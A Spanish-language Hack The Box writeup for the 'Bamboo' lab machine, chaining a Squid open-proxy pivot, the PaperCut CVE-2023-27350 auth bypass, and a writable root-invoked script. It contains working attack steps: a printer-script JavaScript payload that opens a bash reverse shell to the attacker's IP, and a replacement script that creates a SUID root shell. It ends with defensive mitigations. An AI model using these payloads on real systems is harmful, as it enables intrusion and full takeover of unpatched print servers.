---
title: "Bamboo"
description: "Writeup de Bamboo - Hack The Box - Dificultad: Medium. Squid open proxy + CVE-2023-27350 (PaperCut auth bypass) + hijack de server-command para root."
sidebar:
  badge:
    text: Medium
    variant: caution
tags:
  - htb
  - linux
  - medium
  - squid-proxy
  - papercut
  - cve-2023-27350
  - auth-bypass
  - script-injection
  - process-hijack
  - suid-bash
---



# 🐧 Bamboo

> 📅 Fecha: 2026-05-18
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 22.04)
> 🎚️ Dificultad: Medium *(inferida por los 650 puntos — confirmar)*
> 🏆 Puntos: 650
> 🌐 IP: `10.129.238.16`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración a través del proxy Squid](#-enumeración-a-través-del-proxy-squid)
- [Explotación Inicial: CVE-2023-27350 (PaperCut Auth Bypass + RCE)](#-explotación-inicial-cve-2023-27350-papercut-auth-bypass--rce)
- [Escalada de Privilegios (papercut → root)](#-escalada-de-privilegios-papercut--root)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Bamboo expone únicamente SSH (22) y un **Squid proxy en 3128 sin ACL**. Usando el proxy como pivote, se descubren servicios internos en `localhost:9191/9192/9195` correspondientes a **PaperCut MF/NG**. Esta versión es vulnerable a **CVE-2023-27350**: un atacante no autenticado puede saltar la autenticación visitando `/app?service=page/SetupCompleted` y quedar logueado como administrador. Una vez dentro del ConfigEditor se habilitan `print.script.sandboxed=Y` y `print-and-device.script.enabled=Y`, lo que permite inyectar **JavaScript con acceso a `java.lang.Runtime`** en el "Scripting" de una impresora. Al guardar el script y enviar un trabajo de impresión (o al disparar el hook), se obtiene RCE como el usuario `papercut`. La escalada a root explota que el binario `pc-print-deploy` corre como **root** desde `/home/papercut/providers/print-deploy/`, llamando periódicamente al script `server-command` ubicado en `/home/papercut/server/bin/linux-x64/` — un directorio **escribible por el usuario `papercut`**. Reemplazando ese script por uno que cree un `/tmp/rootbash` SUID, se obtiene shell con `euid=0`.

| Campo | Valor |
|-------|-------|
| Puntos débiles | Squid proxy sin ACL, CVE-2023-27350 (PaperCut), root corriendo binarios desde directorio escribible por usuario |
| CVEs | **CVE-2023-27350** |
| Herramientas | `nmap`, `spose`, navegador con proxy, `curl`, `nc`, `pspy64`, `linpeas` |
| Tiempo total | *ver tus notas* |

---

## 🔍 Reconocimiento

### Escaneo completo de puertos (nmap)

```bash
sudo nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn -oN scan_full.txt 10.129.238.16
```

**Salida real:**

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 07:27 -0400
Nmap scan report for 10.129.238.16
Host is up (0.13s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
|_  256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
3128/tcp open  http-proxy Squid http proxy 5.9
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/5.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 153.42 seconds
```

> 💡 **Análisis:** dos puertos abiertos. SSH y, sobre todo, **Squid 5.9** en 3128. Squid es un proxy HTTP/HTTPS; si está mal configurado (sin ACL) puede usarse como **open proxy** para acceder a la red interna del servidor — exactamente lo que vamos a probar. La página de error por defecto sugiere que el `httpd_access` no está restrictivamente filtrado.

### Confirmación de versiones

```bash
nmap -p 22,3128 -sCV -Pn -oN services.txt 10.129.238.16
```

> 💡 **Análisis:** Squid 5.9 es una versión reciente, así que no esperamos CVEs propios del proxy. El objetivo no es romper Squid sino **usarlo** como pivote.

---

## 🗂️ Enumeración a través del proxy Squid

### Port scan a `localhost` desde la perspectiva del servidor (vía Squid)

Uso [spose](https://github.com/aancw/spose) — pequeño script que hace `CONNECT` por el proxy a `localhost:<puerto>` y deduce si está abierto basándose en la respuesta:

```bash
git clone https://github.com/aancw/spose
```

```text
Cloning into 'spose'...
remote: Enumerating objects: 34, done.
remote: Total 34 (delta 11), reused 17 (delta 6), pack-reused 11 (from 1)
Receiving objects: 100% (34/34), 7.89 KiB | 7.89 MiB/s, done.
Resolving deltas: 100% (11/11), done.
```

```bash
python3 spose.py --proxy http://10.129.238.16:3128/ --target localhost --allports
```

**Salida real:**

```text
Scanning all 65,535 TCP ports
Using proxy address http://10.129.238.16:3128/
localhost:22 seems OPEN
localhost:9191 seems OPEN
localhost:9192 seems OPEN
localhost:9195 seems OPEN
```

> 💡 **Análisis:** además de SSH (22), hay tres servicios bindeados solo a loopback: **9191/9192/9195**. Esa combinación es la huella inconfundible de **PaperCut MF/NG**:
> - 9191 → Admin Web Interface (HTTP)
> - 9192 → Admin Web Interface (HTTPS)
> - 9195 → User Web Interface
>
> PaperCut tuvo en 2023 una vulnerabilidad crítica masivamente explotada: **CVE-2023-27350** (CVSS 9.8) — auth bypass que da acceso a la consola de admin sin credenciales. A por ello.

### Configurar el navegador para usar el proxy

Configurar Firefox/Burp para enrutar todo el tráfico HTTP a través de `10.129.238.16:3128`. Una vez configurado, `http://localhost:9191` desde el navegador atacante llega realmente al servicio PaperCut interno de la máquina víctima.

---

## 🚪 Explotación Inicial: CVE-2023-27350 (PaperCut Auth Bypass + RCE)

> ⚠️ **TODO:** intenté primero con el exploit público (no especifiqué cuál); fallaba en mi entorno. Si te acuerdas del repo concreto que probaste y el error que dio, péga­lo aquí para que el writeup documente por qué hubo que ir a mano.

Como el exploit automatizado no funcionó, hago el flujo manualmente — que de paso es más didáctico:

### Paso 1 — Auth bypass via `SetupCompleted`

La vulnerabilidad reside en la página `SetupCompleted`: PaperCut asume que solo se accede a ella **una vez** al final del wizard de configuración, y al cargarla establece la sesión como autenticada con privilegios admin. Por error, esa página sigue siendo accesible sin autenticación después del setup inicial.

Visitar (a través del proxy Squid):

```text
http://localhost:9191/app?service=page/SetupCompleted
```

> 💡 **Análisis:** tras cargar esa URL, la sesión queda "loggeada" como admin. Ahora cualquier endpoint privilegiado de PaperCut es accesible.

### Paso 2 — Habilitar scripting de impresora en el ConfigEditor

```text
http://localhost:9191/app?service=page/ConfigEditor
```

Buscar y modificar dos claves:

| Clave | Valor original | Valor a poner | Acción |
|-------|----------------|---------------|--------|
| `print.script.sandboxed` | `Y` | **`N`** | Update |
| `print-and-device.script.enabled` | `N` | **`Y`** | Update |

> 💡 **Análisis crítico:**
> - `print.script.sandboxed=N` **desactiva el sandbox** del motor de scripting de PaperCut. Por defecto los scripts de impresora corren en un sandbox restringido; al desactivarlo, los scripts pueden invocar APIs Java arbitrarias como `java.lang.Runtime.getRuntime().exec(...)`.
> - `print-and-device.script.enabled=Y` activa que se ejecuten scripts asociados a printer hooks.
>
> Estas dos toggles juntas convierten el "Scripting" de impresora en un **RCE en bandeja**.

### Paso 3 — Inyectar el payload en una impresora

```text
http://localhost:9191/app?service=page/PrinterList
```

Seleccionar cualquier impresora (o crear una) y abrir su tab de Scripting:

```text
http://localhost:9191/app?service=direct/1/PrinterDetails/printerOptionsTab.tab&sp=4
```

Pegar el siguiente script — el hook `printJobHook` se evalúa al cargar/probar el script, y `Runtime.exec` se dispara antes incluso:

```javascript
//
// This script is run when a new job arrives for this printer.  All code is written
// in JavaScript, and prior experience with scripting is assumed.  Use the provided
// recipes, snippets and reference documentation to assist with script development.
//
var runtime = java.lang.Runtime.getRuntime();
var cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.15.228/4444 0>&1"];
runtime.exec(cmd);

function printJobHook(inputs, actions) {
}
```

### Paso 4 — Listener y disparo

```bash
rlwrap -cAr nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.15.228] from (UNKNOWN) [10.129.238.16] 35458
bash: cannot set terminal process group (681): Inappropriate ioctl for device
bash: no job control in this shell
papercut@bamboo:~/server$ id
uid=1001(papercut) gid=1001(papercut) groups=1001(papercut)
```

> 💡 **Análisis:** RCE como `papercut` (uid 1001). Estamos dentro del directorio `~/server`, que es el home de la instalación PaperCut.

### Lectura del user flag

```bash
papercut@bamboo:~$ cat user.txt
[user flag]
```

---

## 🚀 Escalada de Privilegios (papercut → root)

### Enumeración con pspy64

Subo `pspy64` para ver procesos sin necesitar permisos especiales (no requiere root, lee `/proc`):

```bash
papercut@bamboo:~/server/bin/linux-x64$ wget http://10.10.15.228:8080/pspy64
chmod +x pspy64
./pspy64
```

**Salida real (filtrada a lo relevante):**

```text
2026/05/18 14:22:59 CMD: UID=0  PID=554  | v2023-02-14-1341/pc-print-deploy-server -dataDir=/home/papercut/providers/print-deploy/linux-x64//data -pclog.dev
2026/05/18 14:22:59 CMD: UID=0  PID=510  | /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy
2026/05/18 14:22:59 CMD: UID=0  PID=679  | /usr/sbin/cron -f -P
2026/05/18 14:22:59 CMD: UID=1001 PID=817 | ../runtime/linux-x64/jre/bin/pc-app -Djava.io.tmpdir=tmp -Dserver.home=. [...]
2026/05/18 14:22:59 CMD: UID=1001 PID=774 | /home/papercut/server/bin/linux-x64/./app-monitor /home/papercut/server/bin/linux-x64/./app-monitor.conf [...]
[...]
2026/05/18 14:22:59 CMD: UID=104  PID=511 | /usr/sbin/rsyslogd -n -iNONE
2026/05/18 14:22:59 CMD: UID=0    PID=358 | /sbin/auditd
2026/05/18 14:22:59 CMD: UID=998  PID=361 | /usr/local/sbin/laurel --config /etc/laurel/config.toml
```

> 💡 **Análisis clave:** dos procesos críticos corriendo como **`UID=0` (root)**:
> - `pc-print-deploy-server` (PID 554) — el servidor del módulo Print Deploy.
> - `pc-print-deploy` (PID 510) — el binario root del provider.
>
> Y ambos están **bajo `/home/papercut/providers/print-deploy/linux-x64/`**, un path que pertenece a `papercut`. Esto huele muy mal para el sysadmin: root está ejecutando binarios cuyo directorio es escribible por un usuario sin privilegios. También se ve `auditd + laurel` activos — todas nuestras acciones quedan en `/var/log/laurel/`, bueno saberlo.

### Vector: hijack del script `server-command`

Inspeccionando el directorio de instalación de PaperCut:

```bash
papercut@bamboo:~/server/bin/linux-x64$ ls
app-monitor                          pc-pdl-to-image    server-command
app-monitor.conf                     pc-split-scan      setperms
app-server                           pc-udp-redirect    start-server
authpam                              pspy64             stduserdir
authsamba                            roottasks          stop-server
create-client-config-file            sambauserdir       upgrade-server-configuration
create-ssl-keystore
db-tools
direct-print-monitor-config-initializer
gather-ldap-settings
lib
```

> 💡 **Análisis:** el binario `server-command` (escribible por `papercut` porque vive en su home) es invocado por el proceso root `pc-print-deploy-server` cuando se interactúa con la sección **PrintDeploy** del admin UI de PaperCut (`http://localhost:9191/app?service=page/PrintDeploy`). Cada vez que se hace **refresh** o se gestionan los servers desde esa página, `pc-print-deploy-server` (root) llama a `server-command` (escribible por nosotros). **Receta perfecta de privesc.**

### Reemplazar `server-command` por una SUID-bomb

```bash
papercut@bamboo:~/server/bin/linux-x64$ mv server-command server-command.bk
papercut@bamboo:~/server/bin/linux-x64$ cat > server-command << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
papercut@bamboo:~/server/bin/linux-x64$ chmod +x server-command
```

### Disparar la ejecución (refresh en `PrintDeploy`)

Desde el navegador (recordar: a través del proxy Squid):

```text
http://localhost:9191/app?service=page/PrintDeploy
```

Hacer refresh de la página de servers. En pspy se ve el resultado:

```text
2026/05/18 14:32:30 CMD: UID=0  PID=101990 | /tmp/rootbash -p
2026/05/18 14:32:32 CMD: UID=0  PID=101991 | /tmp/rootbash -p
```

### Cobrar el shell SUID

```bash
papercut@bamboo:~/server/bin/linux-x64$ /tmp/rootbash -p
rootbash-5.0# id
uid=1001(papercut) gid=1001(papercut) euid=0(root) egid=0(root) groups=0(root),1001(papercut)
rootbash-5.0# cat /root/root.txt
[root flag]
```

> 💡 **Análisis:** `euid=0`. La flag `-p` evita que bash baje los privilegios efectivos al UID real (1001/papercut).

> ⚠️ **Buena práctica post-exploit:** restaurar el `server-command` original (`mv server-command.bk server-command`) para no romper la app a otros jugadores en máquinas compartidas (en lab privado da igual, en redes reales restaurar siempre el binario backupeado).

---

## 🏁 Flags

| Flag | Hash |
|------|------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. Squid open proxy (3128) sin ACL
        ↓
2. spose por el proxy descubre 9191/9192/9195 en localhost (PaperCut)
        ↓
3. CVE-2023-27350: GET /app?service=page/SetupCompleted → sesión admin
        ↓
4. ConfigEditor: print.script.sandboxed=N + print-and-device.script.enabled=Y
        ↓
5. Inject JS con java.lang.Runtime.exec en Printer → Scripting
        ↓
6. Reverse shell como papercut  →  user.txt
        ↓
7. pspy: root corre pc-print-deploy desde /home/papercut/... (escribible)
        ↓
8. Reemplazar /home/papercut/server/bin/linux-x64/server-command por SUID-bomb
        ↓
9. Refresh en /app?service=page/PrintDeploy dispara server-command como root
        ↓
10. /tmp/rootbash -p → euid=0 → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **Squid abierto = pivote gratis a la red interna.** El `httpd_access allow all` por defecto convierte el proxy en una vía directa hacia servicios bindeados a loopback. Combinar `spose` o `nmap --proxies` con `--allports` siempre que se vea un proxy en 3128/8080/8118.
- **CVE-2023-27350 (PaperCut) — auth bypass por lógica, no por inyección.** Conocer las URLs mágicas (`SetupCompleted`, `SetupComplete`, etc.) ahorra horas de fuzzing. Es un caso de escuela de "estado de sesión asumido por una URL accesible".
- **Sandbox de scripting "configurable" + scripting + sandbox=N = RCE inmediato.** Siempre que veas un panel admin con motor de scripting (Jenkins Groovy, Confluence Velocity, PaperCut JS, etc.), buscar primero si hay forma de **desactivar el sandbox** desde el propio admin — suele ser mucho más fácil que encontrar un sandbox-escape.
- **Root ejecutando binarios desde el home de un usuario es siempre LPE.** El patrón aquí (`pc-print-deploy` corriendo como root pero instalado bajo `/home/papercut/...`) es un anti-patrón clásico de paquetes que se instalan en el home del usuario de servicio sin reasignar ownership a root.
- **Para descubrir el invocador, `pspy64` antes que cualquier otra cosa.** Un único snapshot suele bastar para localizar: el demonio root, el child que lanza, y el path del script vulnerable.

### Mitigaciones (lado defensivo)
1. **Restringir Squid** con ACLs (`acl localnet src ...` + `http_access deny all` por defecto). En entornos productivos, jamás dejar `http_access allow all`.
2. **Parchear PaperCut** a versión ≥ 22.0.9 / 21.2.11 — fixed para CVE-2023-27350. Hasta entonces, bloquear acceso externo a `/SetupCompleted`.
3. **Mantener `print.script.sandboxed=Y`** y `print-and-device.script.enabled=N` salvo necesidad concreta auditada.
4. **No instalar paquetes que corran como root en `$HOME` de usuarios no-root.** El instalador de PaperCut debería poner los binarios en `/opt/papercut/` con `root:root 750`.
5. **Monitorizar cambios** en `/home/papercut/server/bin/linux-x64/server-command` (auditd `-w server-command -p wa`). Ya hay `laurel` configurado — solo falta una regla específica.

---

## 📚 Referencias

- [NVD - CVE-2023-27350 (PaperCut auth bypass)](https://nvd.nist.gov/vuln/detail/CVE-2023-27350)
- [Horizon3.ai - Technical deep dive on CVE-2023-27350](https://www.horizon3.ai/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise/)
- [PaperCut Security Bulletin](https://www.papercut.com/kb/Main/PO-1216-and-PO-1219)
- [spose - Squid pivoting open port scanner](https://github.com/aancw/spose)
- [HackTricks - Squid proxy pivoting](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid)
- [pspy - unprivileged process snooping](https://github.com/DominicBreuker/pspy)
- [GTFOBins - bash (SUID)](https://gtfobins.github.io/gtfobins/bash/#suid)